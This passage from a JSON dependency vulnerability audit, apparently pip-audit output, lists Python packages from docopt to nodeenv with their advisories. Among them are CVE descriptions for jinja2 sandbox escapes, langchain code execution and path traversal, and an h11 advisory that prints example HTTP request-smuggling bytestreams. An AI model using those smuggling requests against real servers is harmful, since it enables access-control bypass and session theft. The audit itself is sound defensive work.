"0.4.0", "vulns": []}, {"name": "docopt", "version": "0.6.2", "vulns": []}, {"name": "docstring-to-markdown", "version": "0.11", "vulns": []}, {"name": "docutils", "version": "0.21.2", "vulns": []}, {"name": "dparse", "version": "0.6.4", "vulns": []}, {"name": "duckduckgo-search", "version": "3.0.2", "vulns": []}, {"name": "ecdsa", "version": "0.19.1", "vulns": []}, {"name": "einops", "version": "0.8.1", "vulns": []}, {"name": "en-core-web-sm", "skip_reason": "Dependency not found on PyPI and could not be audited: en-core-web-sm (3.5.0)"}, {"name": "entrypoints", "version": "0.4", "vulns": []}, {"name": "et-xmlfile", "version": "1.1.0", "vulns": []}, {"name": "exceptiongroup", "version": "1.2.2", "vulns": []}, {"name": "execnet", "version": "2.0.2", "vulns": []}, {"name": "executing", "version": "0.8.3", "vulns": []}, {"name": "face", "version": "24.0.0", "vulns": []}, {"name": "factory-boy", "version": "3.3.3", "vulns": []}, {"name": "faiss-cpu", "version": "1.7.4", "vulns": []}, {"name": "faker", "version": "24.14.1", "vulns": []}, {"name": "fastapi", "version": "0.115.6", "vulns": []}, {"name": "fastjsonschema", "version": "2.16.2", "vulns": []}, {"name": "filelock", "version": "3.16.1", "vulns": []}, {"name": "fire", "version": "0.4.0", "vulns": []}, {"name": "flake8", "version": "6.1.0", "vulns": []}, {"name": "flask", "version": "2.3.3", "vulns": []}, {"name": "flask-cors", "version": "5.0.0", "vulns": [{"id": "GHSA-43qf-4rqw-9q2g", "fix_versions": ["6.0.0"], "aliases": ["CVE-2024-6866"], "description": "corydolphin/flask-cors version 5.0.1 contains a vulnerability where the request path matching is case-insensitive due to the use of the `try_match` function, which is originally intended for matching hosts. This results in a mismatch because paths in URLs are case-sensitive, but the regex matching treats them as case-insensitive. This misconfiguration can lead to significant security vulnerabilities, allowing unauthorized origins to access paths meant to be restricted, resulting in data exposure and potential data leaks."}, {"id": "GHSA-8vgw-p6qm-5gr7", "fix_versions": ["6.0.0"], "aliases": ["CVE-2024-6844"], "description": "A vulnerability in corydolphin/flask-cors version 5.0.1 allows for inconsistent CORS matching due to the handling of the '+' character in URL paths. The request.path is passed through the unquote_plus function, which converts the '+' character to a space ' '. This behavior leads to incorrect path normalization, causing potential mismatches in CORS configuration. As a result, endpoints may not be matched correctly to their CORS settings, leading to unexpected CORS policy application. This can cause unauthorized cross-origin access or block valid requests, creating security vulnerabilities and usability issues."}, {"id": "GHSA-7rxf-gvfg-47g4", "fix_versions": ["6.0.0"], "aliases": ["CVE-2024-6839"], "description": "corydolphin/flask-cors version 5.0.1 contains an improper regex path matching vulnerability. The plugin prioritizes longer regex patterns over more specific ones when matching paths, which can lead to less restrictive CORS policies being applied to sensitive endpoints. This mismatch in regex pattern priority allows unauthorized cross-origin access to sensitive data or functionality, potentially exposing confidential information and increasing the risk of unauthorized actions by malicious actors."}]}, {"name": "flask-login", "version": "0.6.3", "vulns": []}, {"name": "flask-socketio", "version": "5.3.6", "vulns": []}, {"name": "flask-testing", "version": "0.8.1", "vulns": []}, {"name": "flatbuffers", "version": "23.5.26", "vulns": []}, {"name": "fonttools", "version": "4.25.0", "vulns": []}, {"name": "freezegun", "version": "1.5.2", "vulns": []}, {"name": "frozenlist", "version": "1.3.3", "vulns": []}, {"name": "fsspec", "version": "2025.5.1", "vulns": []}, {"name": "ftfy", "version": "6.1.1", "vulns": []}, {"name": "future", "version": "0.18.3", "vulns": []}, {"name": "future-fstrings", "version": "1.2.0", "vulns": []}, {"name": "gast", "version": "0.4.0", "vulns": []}, {"name": "gensim", "version": "4.3.0", "vulns": []}, {"name": "gevent", "version": "25.5.1", "vulns": []}, {"name": "geventhttpclient", "version": "2.3.4", "vulns": []}, {"name": "ghp-import", "version": "2.1.0", "vulns": []}, {"name": "gitdb", "version": "4.0.10", "vulns": []}, {"name": "gitpython", "version": "3.1.43", "vulns": []}, {"name": "glob2", "version": "0.7", "vulns": []}, {"name": "glom", "version": "22.1.0", "vulns": []}, {"name": "gmpy2", "version": "2.1.2", "vulns": []}, {"name": "google-api-core", "version": "2.10.2", "vulns": []}, {"name": "google-api-python-client", "version": "2.98.0", "vulns": []}, {"name": "google-auth", "version": "2.22.0", "vulns": []}, {"name": "google-auth-httplib2", "version": "0.1.0", "vulns": []}, {"name": "google-auth-oauthlib", "version": "1.0.0", "vulns": []}, {"name": "google-genai", "version": "1.20.0", "vulns": []}, {"name": "google-pasta", "version": "0.2.0", "vulns": []}, {"name": "googleapis-common-protos", "version": "1.60.0", "vulns": []}, {"name": "gputil", "version": "1.4.0", "vulns": []}, {"name": "greenlet", "version": "3.2.3", "vulns": []}, {"name": "grpcio", "version": "1.58.0rc1", "vulns": []}, {"name": "grpcio-tools", "version": "1.58.0rc1", "vulns": []}, {"name": "gtts", "version": "2.3.1", "vulns": []}, {"name": "h11", "version": "0.14.0", "vulns": [{"id": "GHSA-vqfr-h8mv-ghfj", "fix_versions": ["0.16.0"], "aliases": ["CVE-2025-43859"], "description": "### Impact  A leniency in h11's parsing of line terminators in chunked-coding message bodies can lead to request smuggling vulnerabilities under certain conditions.  ### Details  HTTP/1.1 Chunked-Encoding bodies are formatted as a sequence of \"chunks\", each of which consists of:  - chunk length - `\\r\\n` - `length` bytes of content - `\\r\\n`  In versions of h11 up to 0.14.0, h11 instead parsed them as:  - chunk length - `\\r\\n` - `length` bytes of content - any two bytes  i.e. it did not validate that the trailing `\\r\\n` bytes were correct, and if you put 2 bytes of garbage there it would be accepted, instead of correctly rejecting the body as malformed.  By itself this is harmless. However, suppose you have a proxy or reverse-proxy that tries to analyze HTTP requests, and your proxy has a _different_ bug in parsing Chunked-Encoding, acting as if the format is:  - chunk length - `\\r\\n` - `length` bytes of content - more bytes of content, as many as it takes until you find a `\\r\\n`  For example, [pound](https://github.com/graygnuorg/pound/pull/43) had this bug -- it can happen if an implementer uses a generic \"read until end of line\" helper to consumes the trailing `\\r\\n`.  In this case, h11 and your proxy may both accept the same stream of bytes, but interpret them differently. For example, consider the following HTTP request(s) (assume all line breaks are `\\r\\n`):  ``` GET /one HTTP/1.1 Host: localhost Transfer-Encoding: chunked  5 AAAAAXX2 45 0  GET /two HTTP/1.1 Host: localhost Transfer-Encoding: chunked  0 ```  Here h11 will interpret it as two requests, one with body `AAAAA45` and one with an empty body, while our hypothetical buggy proxy will interpret it as a single request, with body `AAAAXX20\\r\\n\\r\\nGET /two ...`. And any time two HTTP processors both accept the same string of bytes but interpret them differently, you have the conditions for a \"request smuggling\" attack. For example, if `/two` is a dangerous endpoint and the job of the reverse proxy is to stop requests from getting there, then an attacker could use a bytestream like the above to circumvent this protection.  Even worse, if our buggy reverse proxy receives two requests from different users:  ``` GET /one HTTP/1.1 Host: localhost Transfer-Encoding: chunked  5 AAAAAXX999 0 ```  ``` GET /two HTTP/1.1 Host: localhost Cookie: SESSION_KEY=abcdef... ```  ...it will consider the first request to be complete and valid, and send both on to the h11-based web server over the same socket. The server will then see the two concatenated requests, and interpret them as _one_ request to `/one` whose body includes `/two`'s session key, potentially allowing one user to steal another's credentials.  ### Patches  Fixed in h11 0.15.0.  ### Workarounds  Since exploitation requires the combination of buggy h11 with a buggy (reverse) proxy, fixing either component is sufficient to mitigate this issue.  ### Credits  Reported by Jeppe Bonde Weikop on 2025-01-09."}]}, {"name": "h2", "version": "4.1.0", "vulns": []}, {"name": "h5py", "version": "3.9.0", "vulns": []}, {"name": "heapdict", "version": "1.0.1", "vulns": []}, {"name": "hf-xet", "version": "1.1.3", "vulns": []}, {"name": "holoviews", "version": "1.17.1", "vulns": []}, {"name": "hpack", "version": "4.0.0", "vulns": []}, {"name": "htmldate", "version": "1.5.2", "vulns": []}, {"name": "httpcore", "version": "1.0.7", "vulns": []}, {"name": "httplib2", "version": "0.22.0", "vulns": []}, {"name": "httptools", "version": "0.6.4", "vulns": []}, {"name": "httpx", "version": "0.28.1", "vulns": []}, {"name": "huggingface-hub", "version": "0.33.0", "vulns": []}, {"name": "humanfriendly", "version": "10.0", "vulns": []}, {"name": "hvplot", "version": "0.8.4", "vulns": []}, {"name": "hypercorn", "version": "0.14.4", "vulns": []}, {"name": "hyperframe", "version": "6.0.1", "vulns": []}, {"name": "hyperlink", "version": "21.0.0", "vulns": []}, {"name": "hypothesis", "version": "6.135.11", "vulns": []}, {"name": "identify", "version": "2.5.27", "vulns": []}, {"name": "idna", "version": "3.4", "vulns": [{"id": "PYSEC-2024-60", "fix_versions": ["3.7"], "aliases": ["CVE-2024-3651"], "description": "A vulnerability was identified in the kjd/idna library, specifically within the `idna.encode()` function, affecting version 3.6. The issue arises from the function's handling of crafted input strings, which can lead to quadratic complexity and consequently, a denial of service condition. This vulnerability is triggered by a crafted input that causes the `idna.encode()` function to process the input with considerable computational load, significantly increasing the processing time in a quadratic manner relative to the input size."}]}, {"name": "imagecodecs", "version": "2021.8.26", "vulns": [{"id": "PYSEC-2023-174", "fix_versions": ["2023.9.18"], "aliases": [], "description": "imagecodecs versions before v2023.9.18 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). imagecodecs v2023.9.18 upgrades the bundled libwebp binary to v1.3.2."}, {"id": "GHSA-94vc-p8w7-5p49", "fix_versions": ["2023.9.18"], "aliases": [], "description": "imagecodecs versions before v2023.9.18 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). imagecodecs v2023.9.18 upgrades the bundled libwebp binary to v1.3.2."}]}, {"name": "imagehash", "version": "4.3.2", "vulns": []}, {"name": "imageio", "version": "2.31.1", "vulns": []}, {"name": "imagesize", "version": "1.4.1", "vulns": []}, {"name": "imbalanced-learn", "version": "0.10.1", "vulns": []}, {"name": "importlib-metadata", "version": "6.0.0", "vulns": []}, {"name": "importlib-resources", "version": "6.0.1", "vulns": []}, {"name": "incremental", "version": "21.3.0", "vulns": []}, {"name": "inflection", "version": "0.5.1", "vulns": []}, {"name": "iniconfig", "version": "1.1.1", "vulns": []}, {"name": "intake", "version": "0.6.8", "vulns": []}, {"name": "intervaltree", "version": "3.1.0", "vulns": []}, {"name": "ipdb", "version": "0.13.13", "vulns": []}, {"name": "ipykernel", "version": "6.25.0", "vulns": []}, {"name": "ipython", "version": "8.30.0", "vulns": []}, {"name": "ipython-genutils", "version": "0.2.0", "vulns": []}, {"name": "ipywidgets", "version": "8.0.4", "vulns": []}, {"name": "isort", "version": "5.12.0", "vulns": []}, {"name": "itemadapter", "version": "0.3.0", "vulns": []}, {"name": "itemloaders", "version": "1.0.4", "vulns": []}, {"name": "itsdangerous", "version": "2.2.0", "vulns": []}, {"name": "jaraco-classes", "version": "3.2.1", "vulns": []}, {"name": "jedi", "version": "0.18.1", "vulns": []}, {"name": "jellyfish", "version": "0.9.0", "vulns": []}, {"name": "jinja2", "version": "3.1.2", "vulns": [{"id": "GHSA-h5c8-rqwp-cp95", "fix_versions": ["3.1.3"], "aliases": ["CVE-2024-22195"], "description": "The `xmlattr` filter in affected versions of Jinja accepts keys containing spaces. XML/HTML attributes cannot contain spaces, as each would then be interpreted as a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. Note that accepting keys as user input is not common or a particularly intended use case of the `xmlattr` filter, and an application doing so should already be verifying what keys are provided regardless of this fix."}, {"id": "GHSA-h75v-3vvj-5mfj", "fix_versions": ["3.1.4"], "aliases": ["CVE-2024-34064"], "description": "The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `>`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.  Accepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe."}, {"id": "GHSA-q2x7-8rv6-6q7h", "fix_versions": ["3.1.5"], "aliases": ["CVE-2024-56326"], "description": "An oversight in how the Jinja sandboxed environment detects calls to `str.format` allows an attacker that controls the content of a template to execute arbitrary Python code.  To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.  Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to store a reference to a malicious string's `format` method, then pass that to a filter that calls it. No such filters are built-in to Jinja, but could be present through custom filters in an application. After the fix, such indirect calls are also handled by the sandbox."}, {"id": "GHSA-gmj6-6f8f-6699", "fix_versions": ["3.1.5"], "aliases": ["CVE-2024-56201"], "description": "A bug in the Jinja compiler allows an attacker that controls both the content and filename of a template to execute arbitrary Python code, regardless of if Jinja's sandbox is used.  To exploit the vulnerability, an attacker needs to control both the filename and the contents of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates where the template author can also choose the template filename."}, {"id": "GHSA-cpwx-vrp4-4pq7", "fix_versions": ["3.1.6"], "aliases": ["CVE-2025-27516"], "description": "An oversight in how the Jinja sandboxed environment interacts with the `|attr` filter allows an attacker that controls the content of a template to execute arbitrary Python code.  To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.  Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to use the `|attr` filter to get a reference to a string's plain format method, bypassing the sandbox. After the fix, the `|attr` filter no longer bypasses the environment's attribute lookup."}]}, {"name": "jinja2-time", "version": "0.2.0", "vulns": []}, {"name": "jiter", "version": "0.8.2", "vulns": []}, {"name": "jmespath", "version": "0.10.0", "vulns": []}, {"name": "joblib", "version": "1.2.0", "vulns": []}, {"name": "json5", "version": "0.9.6", "vulns": []}, {"name": "jsonpatch", "version": "1.33", "vulns": []}, {"name": "jsonpointer", "version": "2.1", "vulns": []}, {"name": "jsonschema", "version": "4.20.0", "vulns": []}, {"name": "jsonschema-specifications", "version": "2024.10.1", "vulns": []}, {"name": "jupyter", "version": "1.0.0", "vulns": []}, {"name": "jupyter-client", "version": "7.4.9", "vulns": []}, {"name": "jupyter-console", "version": "6.6.3", "vulns": []}, {"name": "jupyter-core", "version": "5.3.0", "vulns": [{"id": "GHSA-33p9-3p43-82vq", "fix_versions": ["5.8.1"], "aliases": ["CVE-2025-30167"], "description": "## Impact  On Windows, the shared `%PROGRAMDATA%` directory is searched for configuration files (`SYSTEM_CONFIG_PATH` and `SYSTEM_JUPYTER_PATH`), which may allow users to create configuration files affecting other users.  Only shared Windows systems with multiple users and unprotected `%PROGRAMDATA%` are affected.  ## Mitigations  - upgrade to `jupyter_core>=5.8.1` (5.8.0 is patched but breaks `jupyter-server`) , or - as administrator, modify the permissions on the `%PROGRAMDATA%` directory so it is not writable by unauthorized users, or - as administrator, create the `%PROGRAMDATA%\\jupyter` directory with appropriately restrictive permissions, or - as user or administrator, set the `%PROGRAMDATA%` environment variable to a directory with appropriately restrictive permissions (e.g. controlled by administrators _or_ the current user)  ## Credit  Reported via Trend Micro Zero Day Initiative as ZDI-CAN-25932"}]}, {"name": "jupyter-events", "version": "0.6.3", "vulns": []}, {"name": "jupyter-server", "version": "1.23.4", "vulns": [{"id": "PYSEC-2023-155", "fix_versions": ["2.7.2"], "aliases": ["GHSA-r726-vmfq-j9j3", "CVE-2023-39968"], "description": "jupyter-server is the backend for Jupyter web applications. Open Redirect Vulnerability. Maliciously crafted login links to known Jupyter Servers can cause successful login or an already logged-in session to be redirected to arbitrary sites, which should be restricted to Jupyter Server-served URLs. This issue has been addressed in commit `29036259` which is included in release 2.7.2. Users are advised to upgrade. There are no known workarounds for this vulnerability."}, {"id": "PYSEC-2023-157", "fix_versions": ["2.7.2"], "aliases": ["GHSA-64x5-55rw-9974", "CVE-2023-40170"], "description": "jupyter-server is the backend for Jupyter web applications. Improper cross-site credential checks on `/files/` URLs could allow exposure of certain file contents, or accessing files when opening untrusted files via  \"Open image in new tab\". This issue has been addressed in commit `87a49272728` which has been included in release `2.7.2`. Users are advised to upgrade. Users unable to upgrade may use the lower performance `--ContentsManager.files_handler_class=jupyter_server.files.handlers.FilesHandler`, which implements the correct checks."}, {"id": "PYSEC-2023-272", "fix_versions": ["2.11.2"], "aliases": ["GHSA-h56g-gq9v-vc8r", "CVE-2023-49080"], "description": "The Jupyter Server provides the backend (i.e. the core services, APIs, and REST endpoints) for Jupyter web applications like Jupyter notebook, JupyterLab, and Voila. Unhandled errors in API requests coming from an authenticated user include traceback information, which can include path information. There is no known mechanism by which to trigger these errors without authentication, so the paths revealed are not considered particularly sensitive, given that the requesting user has arbitrary execution permissions already in the same environment. A fix has been introduced in commit `0056c3aa52` which no longer includes traceback information in JSON error responses. For compatibility, the traceback field is present, but always empty. This commit has been included in version 2.11.2. Users are advised to upgrade. There are no known workarounds for this vulnerability."}, {"id": "PYSEC-2024-165", "fix_versions": ["2.14.1"], "aliases": ["CVE-2024-35178"], "description": "The Jupyter Server provides the backend for Jupyter web applications. Jupyter Server on Windows has a vulnerability that lets unauthenticated attackers leak the NTLMv2 password hash of the Windows user running the Jupyter server. An attacker can crack this password to gain access to the Windows machine hosting the Jupyter server, or access other network-accessible machines or 3rd party services using that credential. Or an attacker perform an NTLM relay attack without cracking the credential to gain access to other network-accessible machines. This vulnerability is fixed in 2.14.1."}]}, {"name": "jupyter-server-fileid", "version": "0.9.0", "vulns": []}, {"name": "jupyter-server-ydoc", "version": "0.8.0", "vulns": []}, {"name": "jupyter-ydoc", "version": "0.2.4", "vulns": []}, {"name": "jupyterlab", "version": "3.6.3", "vulns": [{"id": "GHSA-44cc-43rp-5947", "fix_versions": ["3.6.7", "4.0.11"], "aliases": ["CVE-2024-22421"], "description": "### Impact Users of JupyterLab who click on a malicious link may get their `Authorization` and `XSRFToken` tokens exposed to a third party when running an older `jupyter-server` version.  ### Patches JupyterLab 4.1.0b2, 4.0.11, and 3.6.7 were patched.  ### Workarounds No workaround has been identified, however users should ensure to upgrade `jupyter-server` to version 2.7.2 or newer which includes a redirect vulnerability fix.  ### References  Vulnerability reported by user @davwwwx via the [bug bounty program](https://app.intigriti.com/programs/jupyter/jupyter/detail) [sponsored by the European Commission](https://commission.europa.eu/news/european-commissions-open-source-programme-office-starts-bug-bounties-2022-01-19_en) and hosted on the [Intigriti platform](https://www.intigriti.com/). "}]}, {"name": "jupyterlab-pygments", "version": "0.1.2", "vulns": []}, {"name": "jupyterlab-server", "version": "2.22.0", "vulns": []}, {"name": "jupyterlab-widgets", "version": "3.0.5", "vulns": []}, {"name": "justext", "version": "3.0.0", "vulns": []}, {"name": "keras", "version": "2.13.1", "vulns": [{"id": "GHSA-cjgq-5qmw-rcj6", "fix_versions": [], "aliases": ["CVE-2024-55459"], "description": "An issue in keras 3.7.0 allows attackers to write arbitrary files to the user's machine via downloading a crafted tar file through the get_file function."}]}, {"name": "keyboard", "version": "0.13.5", "vulns": []}, {"name": "keyring", "version": "23.13.1", "vulns": []}, {"name": "kiwisolver", "version": "1.4.4", "vulns": []}, {"name": "lancedb", "version": "0.1.16", "vulns": []}, {"name": "langchain", "version": "0.0.231", "vulns": [{"id": "PYSEC-2023-92", "fix_versions": ["0.0.247"], "aliases": ["CVE-2023-34541"], "description": "Langchain 0.0.171 is vulnerable to Arbitrary code execution in load_prompt."}, {"id": "PYSEC-2023-98", "fix_versions": ["0.0.247"], "aliases": ["CVE-2023-36258"], "description": "An issue in langchain v.0.0.199 allows an attacker to execute arbitrary code via the PALChain in the python exec method."}, {"id": "PYSEC-2023-109", "fix_versions": ["0.0.247"], "aliases": ["CVE-2023-36188"], "description": "An issue in langchain v.0.0.64 allows a remote attacker to execute arbitrary code via the PALChain parameter in the Python exec method."}, {"id": "PYSEC-2023-110", "fix_versions": ["0.0.247"], "aliases": ["CVE-2023-36189"], "description": "SQL injection vulnerability in langchain v.0.0.64 allows a remote attacker to obtain sensitive information via the SQLDatabaseChain component."}, {"id": "PYSEC-2023-138", "fix_versions": ["0.0.236"], "aliases": ["CVE-2023-36095"], "description": "An issue in Harrison Chase langchain v.0.0.194 allows an attacker to execute arbitrary code via the python exec calls in the PALChain, affected functions include from_math_prompt and from_colored_object_prompt."}, {"id": "PYSEC-2023-145", "fix_versions": ["0.0.247"], "aliases": ["CVE-2023-38860"], "description": "An issue in LangChain v.0.0.231 allows a remote attacker to execute arbitrary code via the prompt parameter."}, {"id": "PYSEC-2023-147", "fix_versions": ["0.0.233"], "aliases": ["CVE-2023-39659"], "description": "An issue in langchain langchain-ai v.0.0.232 and before allows a remote attacker to execute arbitrary code via a crafted script to the PythonAstREPLTool._run component."}, {"id": "PYSEC-2023-162", "fix_versions": ["0.0.308"], "aliases": ["CVE-2023-39631"], "description": "An issue in LanChain-ai Langchain v.0.0.245 allows a remote attacker to execute arbitrary code via the evaluate function in the numexpr library."}, {"id": "PYSEC-2023-205", "fix_versions": ["0.0.317"], "aliases": ["CVE-2023-46229"], "description": "LangChain before 0.0.317 allows SSRF via document_loaders/recursive_url_loader.py because crawling can proceed from an external server to an internal server."}, {"id": "PYSEC-2024-43", "fix_versions": ["0.1.11"], "aliases": ["CVE-2024-28088"], "description": "LangChain through 0.1.10 allows ../ directory traversal by an actor who is able to control the final part of the path parameter in a load_chain call. This bypasses the intended behavior of loading configurations only from the hwchase17/langchain-hub GitHub repository. The outcome can be disclosure of an API key for a large language model online service, or remote code execution."}, {"id": "PYSEC-2024-115", "fix_versions": ["0.2.0"], "aliases": ["CVE-2024-8309"], "description": "A vulnerability in the GraphCypherQAChain class of langchain-ai/langchain-community version 0.2.5 allows for SQL injection through prompt injection. This vulnerability can lead to unauthorized data manipulation, data exfiltration, denial of service (DoS) by deleting all data, breaches in multi-tenant security environments, and data integrity issues. Attackers can create, update, or delete nodes and relationships without proper authorization, extract sensitive data, disrupt services, access data across different tenants, and compromise the integrity of the database."}, {"id": "PYSEC-2024-118", "fix_versions": ["0.2.5"], "aliases": ["CVE-2024-2965"], "description": "A Denial-of-Service (DoS) vulnerability exists in the `SitemapLoader` class of the `langchain-ai/langchain` repository, affecting all versions. The `parse_sitemap` method, responsible for parsing sitemaps and extracting URLs, lacks a mechanism to prevent infinite recursion when a sitemap URL refers to the current sitemap itself. This oversight allows for the possibility of an infinite loop, leading to a crash by exceeding the maximum recursion depth in Python. This vulnerability can be exploited to occupy server socket/port resources and crash the Python process, impacting the availability of services relying on this functionality."}, {"id": "GHSA-92j5-3459-qgp4", "fix_versions": ["0.0.236"], "aliases": ["CVE-2023-38896"], "description": "An issue in Harrison Chase langchain before version 0.0.236 allows a remote attacker to execute arbitrary code via the `from_math_prompt` and `from_colored_object_prompt` functions."}, {"id": "GHSA-7gfq-f96f-g85j", "fix_versions": ["0.0.312"], "aliases": ["CVE-2023-36281"], "description": "An issue in langchain v.0.0.171 allows a remote attacker to execute arbitrary code via the via the a json file to the `load_prompt` parameter. This is related to `__subclasses__` or a template."}, {"id": "GHSA-6h8p-4hx9-w66c", "fix_versions": ["0.0.329"], "aliases": ["CVE-2023-32786"], "description": "In Langchain before 0.0.329, prompt injection allows an attacker to force the service to retrieve data from an arbitrary URL, essentially providing SSRF and potentially injecting content into downstream tasks."}, {"id": "GHSA-h9j7-5xvc-qhg5", "fix_versions": ["0.1.0"], "aliases": ["CVE-2024-0243"], "description": "With the following crawler configuration:  ```python from bs4 import BeautifulSoup as Soup  url = \"https://example.com\" loader = RecursiveUrlLoader(     url=url, max_depth=2, extractor=lambda x: Soup(x, \"html.parser\").text  ) docs = loader.load() ```  An attacker in control of the contents of `https://example.com` could place a malicious HTML file in there with links like \"https://example.completely.different/my_file.html\" and the crawler would proceed to download that file as well even though `prevent_outside=True`.  https://github.com/langchain-ai/langchain/blob/bf0b3cc0b5ade1fb95a5b1b6fa260e99064c2e22/libs/community/langchain_community/document_loaders/recursive_url_loader.py#L51-L51  Resolved in https://github.com/langchain-ai/langchain/pull/15559"}, {"id": "GHSA-rgp8-pm28-3759", "fix_versions": ["0.0.353"], "aliases": ["CVE-2024-3571"], "description": "langchain-ai/langchain is vulnerable to path traversal due to improper limitation of a pathname to a restricted directory ('Path Traversal') in its LocalFileStore functionality. An attacker can leverage this vulnerability to read or write files anywhere on the filesystem, potentially leading to information disclosure or remote code execution. The issue lies in the handling of file paths in the mset and mget methods, where user-supplied input is not adequately sanitized, allowing directory traversal sequences to reach unintended directories."}, {"id": "GHSA-hc5w-c9f8-9cc4", "fix_versions": [], "aliases": ["CVE-2024-7774"], "description": "A path traversal vulnerability exists in the `getFullPath` method of langchain-ai/langchainjs version 0.2.5. This vulnerability allows attackers to save files anywhere in the filesystem, overwrite existing text files, read `.txt` files, and delete files. The vulnerability is exploited through the `setFileContent`, `getParsedFile`, and `mdelete` methods, which do not properly sanitize user input."}, {"id": "GHSA-8h5w-f6q9-wg35", "fix_versions": ["0.0.247"], "aliases": ["CVE-2023-32785"], "description": "In Langchain before 0.0.247, prompt injection allows execution of arbitrary code against the SQL service provided by the chain. "}]}, {"name": "langchain-community", "version": "0.2.17", "vulns": [{"id": "GHSA-45pg-36p6-83v9", "fix_versions": ["0.2.19"], "aliases": ["CVE-2024-8309"], "description": "A vulnerability in the GraphCypherQAChain class of langchain-ai/langchain version 0.2.5 allows for SQL injection through prompt injection. This vulnerability can lead to unauthorized data manipulation, data exfiltration, denial of service (DoS) by deleting all data, breaches in multi-tenant security environments, and data integrity issues. Attackers can create, update, or delete nodes and relationships without proper authorization, extract sensitive data, disrupt services, access data across different tenants, and compromise the integrity of the database."}]}, {"name": "langchain-core", "version": "0.2.43", "vulns": []}, {"name": "langchain-openai", "version": "0.1.25", "vulns": []}, {"name": "langchain-text-splitters", "version": "0.2.4", "vulns": []}, {"name": "langchainplus-sdk", "version": "0.0.20", "vulns": []}, {"name": "langcodes", "version": "3.3.0", "vulns": []}, {"name": "langsmith", "version": "0.1.147", "vulns": []}, {"name": "lazy-loader", "version": "0.2", "vulns": []}, {"name": "lazy-object-proxy", "version": "1.6.0", "vulns": []}, {"name": "libarchive-c", "version": "2.9", "vulns": []}, {"name": "libclang", "version": "16.0.6", "vulns": []}, {"name": "libcst", "version": "1.0.1", "vulns": []}, {"name": "libmambapy", "skip_reason": "Dependency not found on PyPI and could not be audited: libmambapy (1.4.1)"}, {"name": "license-expression", "version": "30.4.3", "vulns": []}, {"name": "linkify-it-py", "version": "2.0.0", "vulns": []}, {"name": "llvmlite", "version": "0.40.0", "vulns": []}, {"name": "lmdb", "version": "1.4.1", "vulns": []}, {"name": "locket", "version": "1.0.0", "vulns": []}, {"name": "locust", "version": "2.37.10", "vulns": []}, {"name": "locust-cloud", "version": "1.23.1", "vulns": []}, {"name": "loguru", "version": "0.7.2", "vulns": []}, {"name": "lxml", "version": "4.9.2", "vulns": []}, {"name": "lz4", "version": "4.3.2", "vulns": []}, {"name": "markdown", "version": "3.4.1", "vulns": []}, {"name": "markdown-it-py", "version": "2.2.0", "vulns": []}, {"name": "markupsafe", "version": "2.1.1", "vulns": []}, {"name": "marshmallow", "version": "3.20.1", "vulns": []}, {"name": "marshmallow-enum", "version": "1.5.1", "vulns": []}, {"name": "matplotlib", "version": "3.7.1", "vulns": []}, {"name": "matplotlib-inline", "version": "0.1.6", "vulns": []}, {"name": "mccabe", "version": "0.7.0", "vulns": []}, {"name": "mdit-py-plugins", "version": "0.3.0", "vulns": []}, {"name": "mdurl", "version": "0.1.0", "vulns": []}, {"name": "meilisearch", "version": "0.21.0", "vulns": []}, {"name": "memory-profiler", "version": "0.61.0", "vulns": []}, {"name": "mergedeep", "version": "1.3.4", "vulns": []}, {"name": "metagpt", "version": "0.1", "vulns": [{"id": "PYSEC-2024-9", "fix_versions": ["0.6.5"], "aliases": ["CVE-2024-23750"], "description": "MetaGPT through 0.6.4 allows the QaEngineer role to execute arbitrary code because RunCode.run_script() passes shell metacharacters to subprocess.Popen."}]}, {"name": "minio", "version": "7.2.12", "vulns": []}, {"name": "mistune", "version": "0.8.4", "vulns": []}, {"name": "mkdocs", "version": "1.5.2", "vulns": []}, {"name": "mkdocs-material", "version": "9.2.8", "vulns": []}, {"name": "mkdocs-material-extensions", "version": "1.1.1", "vulns": []}, {"name": "mkdocs-table-reader-plugin", "version": "2.0.1", "vulns": []}, {"name": "monotonic", "version": "1.6", "vulns": []}, {"name": "more-itertools", "version": "8.12.0", "vulns": []}, {"name": "mouseinfo", "version": "0.1.3", "vulns": []}, {"name": "mpmath", "version": "1.3.0", "vulns": []}, {"name": "msgpack", "version": "1.0.3", "vulns": []}, {"name": "mss", "version": "9.0.1", "vulns": []}, {"name": "multidict", "version": "6.0.2", "vulns": []}, {"name": "multipledispatch", "version": "0.6.0", "vulns": []}, {"name": "multiprocess", "version": "0.70.14", "vulns": []}, {"name": "munkres", "version": "1.1.4", "vulns": []}, {"name": "murmurhash", "version": "1.0.9", "vulns": []}, {"name": "mypy", "version": "1.7.1", "vulns": []}, {"name": "mypy-extensions", "version": "1.0.0", "vulns": []}, {"name": "narwhals", "version": "1.45.0", "vulns": []}, {"name": "navigator-updater", "skip_reason": "Dependency not found on PyPI and could not be audited: navigator-updater (0.4.0)"}, {"name": "nbclassic", "version": "0.5.5", "vulns": []}, {"name": "nbclient", "version": "0.5.13", "vulns": []}, {"name": "nbconvert", "version": "6.5.4", "vulns": []}, {"name": "nbformat", "version": "5.7.0", "vulns": []}, {"name": "ndindex", "version": "1.7", "vulns": []}, {"name": "nest-asyncio", "version": "1.5.6", "vulns": []}, {"name": "networkx", "version": "2.8.8", "vulns": []}, {"name": "nltk", "version": "3.9.1", "vulns": []}, {"name": "nodeenv", "version": "1.8.0", "vulns": []}, 